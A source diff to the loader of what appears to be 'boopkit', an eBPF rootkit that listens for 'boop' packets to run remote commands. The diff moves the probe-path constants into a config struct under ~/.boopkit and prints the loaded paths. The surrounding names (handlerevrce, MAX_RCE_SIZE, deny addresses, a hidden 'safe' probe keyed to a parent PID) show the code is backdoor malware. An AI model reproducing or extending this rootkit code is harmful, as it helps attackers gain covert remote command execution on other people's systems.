@@ -37,20 +37,7 @@
 #include "pr0be.skel.h"
 // clang-format on
 
-#define VERSION "1.0.3"
 
-// PORT must match the ${SRC_PORT} in the /boop script!
-#define PORT 3535
-
-// MAX_DENY_ADDRS is the maximum amount of address that can be denied.
-#define MAX_DENY_ADDRS 1024
-
-// MAX_RCE_SIZE is the maximum size of a boop command to execute.
-#define MAX_RCE_SIZE 1024
-
-// PROBE_BOOP is the eBPF probe to listen for boops
-#define PROBE_BOOP "pr0be.boop.o"
-#define PROBE_SAFE "pr0be.safe.o"
 
 void asciiheader() {
   printf("\n\n");
@@ -97,12 +84,21 @@ void handlerevrce(char dial[INET_ADDRSTRLEN], char *rce) {
 }
 
 struct config {
+  char pr0besafepath[PATH_MAX];
+  char pr0bebooppath[PATH_MAX];
   int denyc;
   char deny[MAX_DENY_ADDRS][INET_ADDRSTRLEN];
 } cfg;
 
 void clisetup(int argc, char **argv) {
   cfg.denyc = 0;
+  if (getenv("HOME") == NULL) {
+    strncpy(cfg.pr0bebooppath, PROBE_BOOP, sizeof PROBE_BOOP);
+    strncpy(cfg.pr0besafepath, PROBE_SAFE, sizeof PROBE_SAFE);
+  }else{
+    sprintf(cfg.pr0besafepath,"%s/.boopkit/%s", getenv("HOME"), PROBE_SAFE);
+    sprintf(cfg.pr0bebooppath,"%s/.boopkit/%s", getenv("HOME"), PROBE_BOOP);
+  }
   for (int i = 0; i < argc; i++) {
     if (argv[i][0] == '-') {
       switch (argv[i][1]) {
@@ -146,8 +142,7 @@ int main(int argc, char **argv) {
   // This will load the safe kernel probes at runtime.
   //
   struct pr0be_safe *sfobj;
-  char sfpath[PATH_MAX] = PROBE_SAFE;
-  printf("  -> Loading eBPF Probe: %s\n", sfpath);
+  printf("  -> Loading eBPF Probe: %s\n", cfg.pr0besafepath);
   sfobj = pr0be_safe__open();
   char pid[MAXPIDLEN];
 
@@ -165,12 +160,12 @@ int main(int argc, char **argv) {
   sfobj->rodata->target_ppid = env.target_ppid;
   loaded = pr0be_safe__load(sfobj);
   if (loaded < 0) {
-    printf("Unable to load eBPF object: %s\n", sfpath);
+    printf("Unable to load eBPF object: %s\n", cfg.pr0besafepath);
     printf("Privileged acces required to load eBPF probe!\n");
     printf("Permission denied.\n");
     return 1;
   }
-  printf("  -> eBPF Probe loaded: %s\n", sfpath);
+  printf("  -> eBPF Probe loaded: %s\n", cfg.pr0besafepath);
 
   // Exit
   int index = PROG_01;
@@ -214,21 +209,20 @@ int main(int argc, char **argv) {
   // This will load the boop kernel probes at runtime.
   //
   struct bpf_object *bpobj;
-  char bppath[PATH_MAX] = PROBE_BOOP;
-  printf("  -> Loading eBPF Probe: %s\n", bppath);
-  bpobj = bpf_object__open(bppath);
+  printf("  -> Loading eBPF Probe: %s\n", cfg.pr0bebooppath);
+  bpobj = bpf_object__open(cfg.pr0bebooppath);
   if (!bpobj) {
-    printf("Unable to open eBPF object: %s\n", bppath);
+    printf("Unable to open eBPF object: %s\n", cfg.pr0bebooppath);
     printf("Privileged acces required to load eBPF probe!\n");
     printf("Permission denied.\n");
     return 1;
   }
   loaded = bpf_object__load(bpobj);
   if (loaded < 0) {
-    printf("Unable to load eBPF object: %s\n", bppath);
+    printf("Unable to load eBPF object: %s\n", cfg.pr0bebooppath);
     return 1;
   }
-  printf("  -> eBPF Probe loaded: %s\n", bppath);
+  printf("  -> eBPF Probe loaded: %s\n", cfg.pr0bebooppath);
   struct bpf_program *program = NULL;
   bpf_object__for_each_program(program, bpobj) {
     printf("  -> eBPF Program Address: %p\n", program);
